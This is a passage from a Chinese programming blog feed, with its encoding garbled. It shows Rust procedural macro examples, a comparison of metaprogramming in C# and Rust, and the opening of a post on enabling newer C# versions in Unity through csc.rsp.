class="punctuation">-&gt;</span> TokenStream &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = parse_macro_input!(input <span class="keyword">as</span> DeriveInput);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">name</span> = &amp;input.ident;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">expanded</span> = quote! &#123;</span><br><span class="line">        <span class="keyword">impl</span> <span class="title class_">Hello</span> <span class="keyword">for</span> #name &#123;</span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">hello</span>() &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;Hello, &#123;&#125;!&quot;</span>, <span class="built_in">stringify!</span>(#name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    expanded.<span class="title function_ invoke__">into</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SingleHelloInput</span> &#123;</span><br><span class="line">    from: syn::Ident,</span><br><span class="line">    to: syn::Ident,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">HelloInput</span> &#123;</span><br><span class="line">    some_hellos: <span class="type">Vec</span>&lt;SingleHelloInput&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Parse</span> <span class="keyword">for</span> <span class="title class_">HelloInput</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">parse</span>(input: syn::parse::ParseStream) <span class="punctuation">-&gt;</span> syn::<span class="type">Result</span>&lt;<span class="keyword">Self</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">some_hellos</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="keyword">while</span> !input.<span class="title function_ invoke__">is_empty</span>() &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">from</span> = input.<span class="title function_ invoke__">parse</span>()?;</span><br><span class="line">            input.parse::&lt;Token![=&gt;]&gt;()</span><br><span class="line">                .<span class="title function_ invoke__">map_err</span>(|e| syn::Error::<span class="title function_ invoke__">new</span>(e.<span class="title function_ invoke__">span</span>(), <span class="string">&quot;Expected `=&gt;`&quot;</span>))?;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">to</span> = input.<span class="title function_ invoke__">parse</span>()?;</span><br><span class="line">            some_hellos.<span class="title function_ invoke__">push</span>(SingleHelloInput &#123; from, to &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HelloInput &#123; some_hellos &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[proc_macro]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">say_hello</span>(input: TokenStream) <span class="punctuation">-&gt;</span> TokenStream &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = parse_macro_input!(input <span class="keyword">as</span> HelloInput);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hellos</span> = input.some_hellos.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">map</span>(|SingleHelloInput &#123; from, to &#125;| &#123;</span><br><span class="line">        quote! &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;say hello from &#123;&#125; to &#123;&#125;!&quot;</span>, <span class="built_in">stringify!</span>(#from), <span class="built_in">stringify!</span>(#to));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">expanded</span> = quote! &#123;</span><br><span class="line">        #(#hellos)*</span><br><span class="line">    &#125;;</span><br><span class="line">    expanded.<span class="title function_ invoke__">into</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠè¯¥é¡¹ç›®æ·»åŠ åˆ°å¦ä¸€ä¸ªé¡¹ç›®çš„ä¾èµ–ï¼Œå¹¶æµ‹è¯•å®çš„åŠŸèƒ½ï¼š</p><blockquote><p>  <code>hello_derive</code> å®çš„åŠŸèƒ½æ˜¯ç»™ç›®æ ‡å®ç° <code>Hello</code> ç‰¹å¾ï¼ˆå½“ç„¶ï¼Œè¿™å¾—ä½ è‡ªå·±å®šä¹‰ï¼‰ï¼Œäºæ˜¯å¯ä»¥è°ƒç”¨ <code>World::hello()</code> æ–¹æ³•</p><p>  æ³¨æ„:warning: ï¼šæ­¤å¤„ä¸æ˜¯é™æ€æ–¹æ³•ï¼ŒRust å¹¶ä¸èƒ½ç›´æ¥åœ¨ struct ä¸­å®šä¹‰é™æ€æ–¹æ³•ï¼ˆå®é™…ä¸Šä¹Ÿæ²¡æœ‰è¿™ä¸ªæ¦‚å¿µxï¼‰ï¼Œæ­¤å¤„æ˜¯ç”±äº World ç»“æ„ä½“æ²¡æœ‰ä»»ä½•æˆå‘˜ï¼Œæ‰€ä»¥åˆ›å»º World å®ä¾‹å¯ä»¥ç›´æ¥ç®€åŒ–æˆ <code>World</code> ï¼Œè€Œä¸éœ€è¦ <code>World &#123; &#125;</code></p><p>  <code>say_hello</code> å®åˆ™æ˜¯å¯ä»¥æ¥å—ä»»æ„å¤šç»„è¾“å…¥ï¼Œæ¯ä¸€ç»„çš„æ ¼å¼å¿…é¡»æ˜¯ <code>æ ‡è¯†ç¬¦ =&gt; æ ‡è¯†ç¬¦</code> ï¼Œè¯¥å®çš„è§£ææ˜¯è‡ªå®šä¹‰çš„ã€‚</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> test_macro::&#123;Hello, say_hello&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    World::<span class="title function_ invoke__">hello</span>();</span><br><span class="line">    say_hello!(World =&gt; Rust);</span><br><span class="line">    say_hello! &#123;</span><br><span class="line">        Hacbit =&gt; Rust</span><br><span class="line">        Rust =&gt; Hacbit     My =&gt; ABAB</span><br><span class="line">            My =&gt; Anii</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Hello)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">World</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">hello</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hello, World!</span><br><span class="line"><span class="built_in">say</span> hello <span class="keyword">from</span> World <span class="keyword">to</span> Rust!</span><br><span class="line"><span class="built_in">say</span> hello <span class="keyword">from</span> Hacbit <span class="keyword">to</span> Rust!</span><br><span class="line"><span class="built_in">say</span> hello <span class="keyword">from</span> Rust <span class="keyword">to</span> Hacbit!</span><br><span class="line"><span class="built_in">say</span> hello <span class="keyword">from</span> My <span class="keyword">to</span> ABAB!</span><br><span class="line"><span class="built_in">say</span> hello <span class="keyword">from</span> My <span class="keyword">to</span> Anii!</span><br></pre></td></tr></table></figure><h2 id="C-å’ŒRuståœ¨å…ƒç¼–ç¨‹å®ç°ä¸Šçš„å¼‚åŒ"><a href="#C-å’ŒRuståœ¨å…ƒç¼–ç¨‹å®ç°ä¸Šçš„å¼‚åŒ" class="headerlink" title="C#å’ŒRuståœ¨å…ƒç¼–ç¨‹å®ç°ä¸Šçš„å¼‚åŒ"></a>C#å’ŒRuståœ¨å…ƒç¼–ç¨‹å®ç°ä¸Šçš„å¼‚åŒ</h2><p>çœ‹äº†ä¸Šé¢çš„å‡ ä¸ªç¤ºä¾‹ï¼Œåº”è¯¥å¯¹ä¸¤è€…çš„å…ƒç¼–ç¨‹æœºåˆ¶æœ‰äº†ä¸€å®šçš„å°è±¡ã€‚</p><p>å¯¹äº C# å’Œ Rust çš„ç›¸åŒçš„åœ°æ–¹ï¼ˆè™½ç„¶ä¸Šé¢çš„ä¾‹å­å¯èƒ½æ²¡æœ‰å¾ˆå¥½çš„ä½“ç°ï¼‰ï¼š</p><ul><li>éƒ½æ˜¯æŠŠæºä»£ç è§£ææˆ AST ï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰ï¼Œç„¶ååˆ†æèŠ‚ç‚¹å¯¹è±¡</li><li>éœ€è¦é¢å¤–å¼•å…¥åº“é¡¹ç›®ä½œä¸ºç±»ä¼¼ç¼–è¯‘å™¨æ’ä»¶çš„ä¸œè¥¿ï¼Œä»¥æ­¤å®ç°åœ¨ç¼–è¯‘æœŸå¯¹åŸæœ‰ä»£ç çš„åŠŸèƒ½è¿›è¡Œæ‹“å±•</li></ul><p>ä¸è¿‡å·®å¼‚ä¹Ÿååˆ†æ˜¾è‘—ï¼š</p><ul><li>C# æä¾›å¤šä¸ªç®¡é“ï¼ˆæ¯”å¦‚ <code>context.SyntaxProvider</code>ï¼‰æ¥è®¿é—®å„ç§èŠ‚ç‚¹ï¼ˆæ¯”å¦‚ <code>ClassDeclarationSyntax</code>ï¼‰å¯¹è±¡ï¼Œç”Ÿæˆå™¨å¯ä»¥è‡ªå®šä¹‰ç­›é€‰æ¡ä»¶ï¼Œå¹¶åˆ†æç­›é€‰å‡ºæ¥çš„èŠ‚ç‚¹æ¥ç”Ÿæˆç›¸å…³æ‹“å±•ï¼› Rust åˆ™éœ€è¦ç”¨æˆ·æ˜¾ç¤ºçš„å» â€œä½¿ç”¨â€ å®ï¼Œæ¯”å¦‚ <code>#[derive(Hello)]</code> å°±æ˜¯ç›´æ¥æŒ‡å®šäº†å®çš„ä½¿ç”¨ç›®æ ‡ï¼Œå› è€Œæ— éœ€ç­›é€‰ã€‚æ‰€ä»¥å®é™…ä¸Šï¼Œ<strong>C# åœ¨è·å–å…ƒä¿¡æ¯çš„èŒƒå›´æ›´å¹¿ï¼ŒRust åªèƒ½è·å–ç›®æ ‡çš„å…ƒä¿¡æ¯ï¼Œè€Œæ— æ³•å¾—çŸ¥ç›®æ ‡ä»¥å¤–çš„å…ƒä¿¡æ¯ã€‚</strong></li><li>ä½†æ˜¯å¦ä¸€æ–¹é¢ï¼Œ<strong>å—é™äº C# æœ¬èº«çš„è¯­æ³•ï¼ŒC# æ— æ³•æä¾›æ›´ç»†ç²’åº¦çš„æŒ‡ä»¤æµåˆ†æ</strong>ã€‚è€Œ Rust åœ¨è¿™æ–¹é¢å°±ååˆ†çµæ´»ï¼Œå¯ä»¥è‡ªå®šä¹‰ Token æµè§£æå™¨ï¼Œä½ å¯ä»¥æŠŠå„ç§ç¬¦å·ï¼ˆå…è®¸çš„ Tokenï¼‰å¡è¿›çš„å®è§„åˆ™ä¸­ï¼Œè€Œæ— éœ€åœ¨æ„è¯­æ³•ï¼ˆå°±åƒä¸Šé¢çš„ <code>say_hello!</code> é‚£æ ·ï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œ<strong>åœ¨ Rust ä¸­ä½ å¯ä»¥å®šä¹‰è‡ªå·±è¯­æ³•ã€‚</strong></li></ul><p>æ— è®ºæ˜¯ C# çš„ç”Ÿæˆå™¨&#x2F;åˆ†æå™¨ï¼Œè¿˜æ˜¯ Rust çš„å®ï¼Œå…¶å®æ ¸å¿ƒåŒºåˆ«æ— éå°±æ˜¯ä½œç”¨èŒƒå›´çš„ä¸åŒï¼Œä¸€ä¸ªæ˜¯å…¨å±€ï¼Œä¸€ä¸ªæ˜¯å±€éƒ¨ã€‚è€Œç”±è¿™ä¸¤ç‚¹åˆ†æ­§ï¼Œåˆå¾ˆå®¹æ˜“æƒ³åˆ°ï¼ŒC# çš„å…ƒç¼–ç¨‹æœºåˆ¶åªèƒ½è¿›è¡Œ<strong>å¢é‡</strong>ï¼Œæ˜¯ä¸èƒ½å¤Ÿä¿®æ”¹åŸæœ‰ä»£ç çš„ï¼ˆå› ä¸ºç”Ÿæˆå™¨&#x2F;åˆ†æå™¨æ˜¯å¹¶è¡Œçš„ï¼Œè€Œå…ƒä¿¡æ¯ä½œä¸ºå…±äº«èµ„æºï¼Œè‡ªç„¶ä¸èƒ½éšæ„ä¿®æ”¹ï¼‰ï¼›Rust çš„å®ä½œç”¨èŒƒå›´åªæœ‰å±€éƒ¨ï¼Œæ¯ä¸ªå®ä¹‹é—´æ˜¯ç‹¬ç«‹ï¼ˆæˆ–è€…åŒ…å«ï¼‰ï¼Œè€Œä¸ä¼šäº§ç”Ÿäº¤å‰ï¼Œå› è€Œå¯ä»¥<strong>éšæ„ä¿®æ”¹åŸæœ‰é€»è¾‘</strong>ã€‚</p><p>ä¸ç®¡å…·ä½“å®ç°å¦‚ä½•ï¼Œæ¯«æ— ç–‘é—®ä»–ä»¬éƒ½æ˜¯å…·æœ‰ç›¸å½“ç¨‹åº¦å¯å®šåˆ¶åŒ–çš„ï¼Œå¹¶ä¸”ä¹Ÿèƒ½ä¿è¯è¿è¡Œæ—¶æ€§èƒ½å’Œå®‰å…¨æ€§ã€‚ä¸åŒäºåå°„ã€æˆ–è€…è¿è¡Œæ—¶åŠ¨æ€æ‰§è¡Œå­—ç¬¦ä¸²ç­‰è¿è¡Œæ—¶ç‰¹æ€§ï¼Œä»–ä»¬æœ¬è´¨ä¸Šæ˜¯<strong>å°†ä¸€éƒ¨åˆ†è¿è¡Œæ—¶é€»è¾‘æå‰åˆ°ç¼–è¯‘æœŸ</strong>ï¼Œå› è€Œå‡å°‘è¿è¡Œæ—¶çš„æ€§èƒ½æŸè€—ï¼ˆå½“ç„¶ï¼Œè¿™ä¹Ÿæ„å‘³ç€ä½ éœ€è¦ä»˜å‡ºæ›´é•¿ç¼–è¯‘æ—¶é—´çš„ä»£ä»· :laughing: ï¼‰ï¼Œä¹Ÿå°±æ˜¯ Rust ä¸­ç‰¹åˆ«æå€¡çš„<strong>é›¶æˆæœ¬æŠ½è±¡</strong>ã€‚åŒæ—¶ï¼Œç”±äºè¿™äº›ç¼–è¯‘æœŸç‰¹æ€§åªä¼šåœ¨ç¼–è¯‘æœŸäº§ç”Ÿä½œç”¨ï¼Œå°±ä¸ä¼šæœ‰è¿è¡Œæ—¶ç‰¹æ€§é‚£æ ·æ½œåœ¨çš„æ³¨å…¥æ¼æ´ç­‰å®‰å…¨é£é™©ã€‚ï¼ˆé™¤éé»‘å®¢èƒ½å¤Ÿæ§åˆ¶ä½ çš„ç¼–è¯‘ç®¡çº¿ x :laughing: ï¼‰</p><h2 id="é€‚ç”¨åœºæ™¯"><a href="#é€‚ç”¨åœºæ™¯" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a>é€‚ç”¨åœºæ™¯</h2><p>æœ‰ä»€ä¹ˆæ¯”è¾ƒåˆé€‚çš„ä½¿ç”¨åœºæ™¯å‘¢ï¼Ÿ</p><p>æŒ‰ç…§æˆ‘çš„ç»éªŒå¯èƒ½å¾€å¾€æ˜¯ç”¨æ¥åŠ¨æ€å®ç°ä¸€äº›æ¥å£ï¼Œå‡½æ•°ä¹‹ç±»çš„ã€‚ä¸è¿‡è¿™ä¸ªåº”è¯¥æ›´å®¹æ˜“åœ¨ Rust ä¸­å®ç°ï¼ˆä¹Ÿååˆ†è‡ªç„¶ï¼‰ï¼Œå› ä¸º Rust çš„ <code>struct</code> å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹å»å®ç°æ–°åŠŸèƒ½ï¼Œåªéœ€è¦å®šä¹‰ä¸€ä¸ªæ–°çš„ <code>trait</code> ï¼ˆå¦‚æœæ˜¯åœ¨è¯¥ <code>struct</code> å®šä¹‰æ‰€åœ¨çš„æ¨¡å—ä¹‹å¤–ï¼‰ã€‚è€Œæ”¾åœ¨ C# å°±æœ‰ç‚¹éº»çƒ¦ï¼Œé€šå¸¸æˆ‘ä»¬ä¸å¾—ä¸éœ€è¦å¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨ <code>partial</code> å…³é”®å­—ï¼Œå¹¶ä¸”ä¹Ÿæ— æ³•å¯¹ä¸€äº›å†…ç½®çš„ï¼ˆæˆ–ç¬¬ä¸‰æ–¹åº“ä¸­çš„ï¼‰ç±»å‹è¿›è¡Œæ›´å¤§é™åº¦çš„æ‹“å±•ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¸èƒ½ç»™ <code>int</code> æ·»åŠ æ–°çš„æ¥å£å®ç°ã€‚</p><p>ç”Ÿæˆä¸€äº›æ¡¥æ¥ä»£ç å¯èƒ½æ˜¯ä¸é”™çš„é€‰æ‹©ï¼Œæ¯”å¦‚æˆ‘ä»¬æƒ³è¦åœ¨ c ç«¯å’Œ s ç«¯äº¤æ¢æ•°æ®ï¼Œé‚£ä¹ˆè‚¯å®šéœ€è¦å¯¹ä¸¤ç«¯çš„æ•°æ®ç»“æ„è¿›è¡Œä¸€ä¸ªé€‚é…ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ ¹æ®é…ç½®åŠ¨æ€ç”Ÿæˆï¼›æˆ–è€…æ˜¯æƒ³è¦å’Œå…¶ä»–è¯­è¨€èµ° FFIï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥é€šè¿‡å…ƒç¼–ç¨‹æœºåˆ¶ç”Ÿæˆç›¸å…³ä»£ç ï¼ˆæ¯”å¦‚ pyo3 é¡¹ç›®å¯¹ Rust å’Œ Python çš„ FFI é€šä¿¡çš„å¤„ç†ï¼‰ã€‚</p><p>ä¸è¿‡ C# çš„è¯Šæ–­å™¨ç¡®å®æ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„ä¸œè¥¿ï¼Œå¤©ç„¶é€‚åˆå†™æ¡†æ¶ã€‚æ¯•ç«Ÿå¯ä»¥å…¨å±€æ£€æŸ¥ä½ çš„ä»£ç ï¼Œå¹¶ä¸”æ·»åŠ å„ç§çº¦æŸï¼Œä»¥å‡å°‘ä½¿ç”¨æ¡†æ¶æ—¶çš„æœªå®šä¹‰è¡Œä¸ºï¼Œæ‰€ä»¥å¦‚æœå»ç¿»å„ç§ç¬¬ä¸‰æ–¹åº“ï¼Œä»–ä»¬å¤§å¤šéƒ½ä¼šå†™ä¸€äº› Analyzer ã€‚Rust çš„ç¡®åšä¸äº†è¿™å—ï¼ŒåŸå› å¦‚å‰æ–‡æ‰€è¿°ï¼ŒRust ä¸æä¾›èƒ½å¤Ÿç›´æ¥è®¿é—®å…¨å±€è¯­æ³•æ ‘çš„ APIï¼Œä¸è¿‡ Rust æœ¬èº«ä¹Ÿæœ‰ rust-analyzer ï¼Œè¿˜å¯ä»¥é…åˆ cargo-clippyï¼Œå› æ­¤å¯¹äºä»£ç æœ¬èº«çš„æ£€æŸ¥ä¹Ÿå¾ˆä¸¥æ ¼å°±æ˜¯äº†ï¼ˆï¼‰</p><h2 id="å†™åœ¨åé¢"><a href="#å†™åœ¨åé¢" class="headerlink" title="å†™åœ¨åé¢"></a>å†™åœ¨åé¢</h2><p>è¦æˆ‘è¯´çš„è¯ï¼Œè‚¯å®šæ˜¯ Rust çš„æœºåˆ¶å†™çš„æ›´çˆ½ï¼ˆï¼‰ï¼Œæ¯•ç«Ÿå¯ä»¥è‡ªå®šä¹‰è¯­æ³•æ¬¸ï¼Œè¶…å¸…çš„å§ï¼</p><p>Rust ç‹¬ç«‹å¼€å‘çš„è¯ï¼Œéšä¾¿å†™ç‚¹å®è‡ªå¨±è‡ªä¹å…¶å®æŒºæœ‰è¶£çš„ï¼Œä¹‹å‰ä¹Ÿå†™è¿‡ä¸€äº›<del>å¥‡å¥‡æ€ªæ€ªçš„</del>åŠŸèƒ½ï¼Œæ¯”å¦‚ä½¿ç”¨å®åŠ è½½ json æ–‡ä»¶è‡ªåŠ¨ç”Ÿæˆ enumã€‚ï¼ˆC# å½“ç„¶ä¹Ÿå¾ˆå®¹æ˜“å®ç°ï¼‰</p><p>ç”±äºæˆ‘æ˜¯ Rust å‡ºèº«ï¼Œä»£ç é£æ ¼æå¤§ç¨‹åº¦å—åˆ°äº† Rust è®¾è®¡å“²å­¦çš„å½±å“ï¼Œåœ¨ä½¿ç”¨ C# çš„æ—¶å€™ï¼Œè¯´å®è¯å¤šæ¬¡å°è¯•å°†ä¸€äº› Rust ç‰¹æ€§åœ¨ C# ä¸­å®ç°ï¼ˆï¼‰ï¼Œä¸è¿‡ç¡®å®æœ‰ç‚¹éº»çƒ¦ï¼Œç‰¹åˆ«æ˜¯æˆ‘æƒ³è¦å®ç°ç±»ä¼¼è¿‡ç¨‹å®çš„ä¸œè¥¿æ—¶å€™é‡åˆ°äº†å¾ˆå¤§çš„é˜»ç¢ï¼ˆä¸€å¤§ç†ç”±å°±æ˜¯ C# ä¸å…è®¸ç”¨æˆ·è‡ªå·±åˆ†æ TokenStreamï¼Œä½¿å¾—ä¸å¯èƒ½åƒ Rust é‚£æ ·è‡ªç”±ï¼‰ï¼Œæˆ‘å°è¯•çš„ä¸€ä¸ªæ€è·¯æ˜¯ä½¿ç”¨å­—ç¬¦ä¸²ï¼Œç„¶åæˆ‘å°±è‡ªå·±è®¾è®¡è¯­æ³•ï¼ˆå‚è€ƒ Rustï¼‰ï¼Œæ“äº†è¯æ³•åˆ†æï¼Œè¯­æ³•åˆ†æã€‚ä¸è¿‡è¯è¯´å›æ¥ï¼Œè¿™æ ·å°±ä¸åƒæ˜¯ C#ï¼Œå›ºç„¶äººå®¶ Lispï¼ŒRust å¯ä»¥è®¾è®¡è‡ªå·±çš„è¯­æ³•ï¼Œä½†æ˜¯ä»–ä»¬éƒ½è¿˜æ˜¯ Lispï¼ŒRustï¼Œè€Œ C# æ—¢ç„¶æœ¬èº«è®¾è®¡å“²å­¦å°±æ˜¯è¿™æ ·ï¼Œå¼ºè¡Œæ”¹å˜å†™æ³•åªä¼šæ˜¾å¾—æŠ½è±¡å’Œä¸‘é™‹ã€‚</p><p>å½“ç„¶ Rust å’Œ C# éƒ½æ˜¯æå…¶ä¼˜ç§€çš„è¯­è¨€ï¼Œå†™å·¥ç¨‹ç¡®å®èˆ’æœã€‚<del>ï¼ˆå ä¸ªç”²ï¼‰</del></p><p>ä¸çŸ¥é“çœ‹æœ¬ç¯‡æ–‡ç« çš„è¯»è€…æœ‰æ²¡æœ‰ç©è¿‡æ‰€å­¦è¯­è¨€çš„å…ƒç¼–ç¨‹æœºåˆ¶ï¼Œå¦‚æœæœ¬æ–‡ç»™ä½ æ‰“å¼€äº†ä¸€æ‰‡æ–°ä¸–ç•Œçš„å¤§é—¨<del>ï¼ˆå¤§æ¦‚ä¸æ˜¯æ·±æ¸Šå§ï¼‰</del>ï¼Œå°†æ˜¯æˆ‘çš„è£å¹¸ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> CSharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨Unityä¸­è§£æ”¾é«˜ç‰ˆæœ¬C#ç‰¹æ€§</title>
      <link href="/%E5%9C%A8Unity%E4%B8%AD%E8%A7%A3%E6%94%BE%E9%AB%98%E7%89%88%E6%9C%ACCS%E7%89%B9%E6%80%A7/"/>
      <url>/%E5%9C%A8Unity%E4%B8%AD%E8%A7%A3%E6%94%BE%E9%AB%98%E7%89%88%E6%9C%ACCS%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰æˆ‘åœ¨çŸ¥ä¹é—®è¿‡ç›¸å…³é—®é¢˜ï¼Œåé¢å‚è€ƒäº†å‡ ä¸ªçŸ¥å‹çš„å›ç­”ï¼Œå€Ÿé‰´äº†ä¸€äº›é¡¹ç›®ï¼Œä¹Ÿç®—æ˜¯åŸºæœ¬è§£å†³äº†è¿™ä¸ªé—®é¢˜</p><p>ä¹Ÿé¡ºä¾¿é™„ä¸Šæˆ‘çš„çŸ¥ä¹å›ç­”ï¼š<a href="https://www.zhihu.com/question/11672499668/answer/103930816515">https://www.zhihu.com/question/11672499668/answer/103930816515</a></p><p>ä»¥ä¸‹æ˜¯å…³äºå¦‚ä½•åœ¨ Unity ä¸­ä½¿ç”¨<strong>æ›´é«˜ç‰ˆæœ¬çš„ C# ç‰¹æ€§</strong>çš„è¯¦ç»†è§£å†³åŠæ³•ï¼ˆ<strong>å…·æœ‰ä¸€å®šå±€é™æ€§</strong>ï¼‰</p><span id="more"></span><h2 id="Comfirm-the-C-version-that-Unity-supports"><a href="#Comfirm-the-C-version-that-Unity-supports" class="headerlink" title="Comfirm the C# version that Unity supports"></a>Comfirm the C# version that Unity supports</h2><p>å…³äºä½ çš„ unity editor <strong>æœ¬èº«èƒ½å¤Ÿæ”¯æŒ</strong>åˆ°å¤šé«˜çš„ C# ç‰ˆæœ¬ï¼Œä»¥æˆ‘çš„ unity 2022.3.52f1c1 ä¸ºä¾‹ï¼Œå» unity editor æ‰€åœ¨çš„ç›®å½•ä¸‹é¢è¿™ä¸ªè·¯å¾„ï¼Œæ‰“å¼€ README é‡Œé¢æœ‰ dotnet sdk ç‰ˆæœ¬</p><img src="/%E5%9C%A8Unity%E4%B8%AD%E8%A7%A3%E6%94%BE%E9%AB%98%E7%89%88%E6%9C%ACCS%E7%89%B9%E6%80%A7/dotnet_sdk.png" alt="dotnet_sdk" style="zoom: 67%;"><p>ç„¶åå»å®˜æ–¹æœç´¢ä¸€ä¸‹è¯¥ç‰ˆæœ¬çš„ç›¸å…³ä¿¡æ¯ï¼š</p><img src="/%E5%9C%A8Unity%E4%B8%AD%E8%A7%A3%E6%94%BE%E9%AB%98%E7%89%88%E6%9C%ACCS%E7%89%B9%E6%80%A7/sdk_search.png" alt="sdk_search" style="zoom: 67%;"><p>å‘ç°å¯ä»¥æ”¯æŒåˆ° C#10ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼ŒC#å¤„äºå¯é¢„è§ˆçŠ¶æ€ï¼Œå¦‚æœæ˜¯ä¸€èˆ¬çš„ cs é¡¹ç›®ï¼ˆä½¿ç”¨è¯¥ sdkï¼‰ï¼Œå¯ä»¥ç›´æ¥åœ¨ csproj æŒ‡å®š <code>&lt;LangVersion&gt;preview&lt;/LangVersion&gt;</code>  æ¥ä½¿ç”¨éƒ¨åˆ†çš„ C#11 ç‰¹æ€§ã€‚</p><p>ä½†æ˜¯ Unity ä¸­çš„æ‰€è°“ C# é¡¹ç›®å¹¶ä¸æ˜¯è¿™ä¹ˆä¸€å›äº‹ï¼Œé¡¹ç›®æ ¹ç›®å½•é‡Œé¢çš„ä¸€å † .csproj æ–‡ä»¶ï¼Œåªæ˜¯ Unity è‡ªåŠ¨ç”Ÿæˆç»™ IDE çœ‹çš„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç”¨ Riderï¼ŒVSCode ä¹‹ç±»çš„ IDE æ‰“å¼€é¡¹ç›®åèƒ½è¿›è¡Œè§£æï¼ˆï¼‰</p><h2 id="Unity-Compile"><a href="#Unity-Compile" class="headerlink" title="Unity Compile"></a>Unity Compile</h2><p>åœ¨<a href="https://docs.unity3d.com/2022.3/Documentation/Manual/CSharpCompiler.html">å®˜æ–¹æ‰‹å†Œ</a>é‡Œé¢æœ‰å…³äºè¿™ä¸ªçš„è¯´æ˜ï¼šUnity editor ä¼šæŒ‡å®šé»˜è®¤çš„ç¼–è¯‘é€‰é¡¹ç»™åç«¯çš„ Roslyn ç¼–è¯‘å™¨ï¼ˆä¹Ÿå°±æ˜¯C#ç‰ˆæœ¬æŒ‡å®š 9.0ï¼‰</p><img src="/%E5%9C%A8Unity%E4%B8%AD%E8%A7%A3%E6%94%BE%E9%AB%98%E7%89%88%E6%9C%ACCS%E7%89%B9%E6%80%A7/compiler.png" alt="compiler" style="zoom:67%;"><p>ä¸è¿‡åé¢ä¹Ÿè¯´æ˜äº†å¯ä»¥ä¼ é€’åˆ«çš„å‚æ•°ï¼ˆï¼‰ï¼Œäºæ˜¯å¯ä»¥åœ¨<a href="https://docs.unity3d.com/2022.3/Documentation/Manual/CustomScriptingSymbols.html">è¿™ç¯‡æ–‡ç« </a>æ‰¾åˆ°ç­”æ¡ˆï¼Œç”¨æˆ·å¯ä»¥åœ¨ Assets&#x2F; ç›®å½•ä¸‹æ·»åŠ  csc.rsp æ–‡ä»¶æ¥æŒ‡å®šç¼–è¯‘å‚æ•°ï¼Œæ–‡æ¡£ç»™çš„ä¾‹å­æ˜¯åœ¨ .rsp æ–‡ä»¶é‡Œé€šè¿‡ <code>-define:XXXX</code> æ¥å®šä¹‰å®ï¼Œç”¨ä»¥æ¡ä»¶ç¼–è¯‘ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬æ˜¾ç„¶èƒ½ç©ç‚¹åˆ«çš„ä¸œè¥¿ï¼Œæ¯”å¦‚æŒ‡å®š <code>-langversion</code> ï¼ŒæŒ‰ç…§å‰æ–‡çš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥å¯ç”¨ C#11 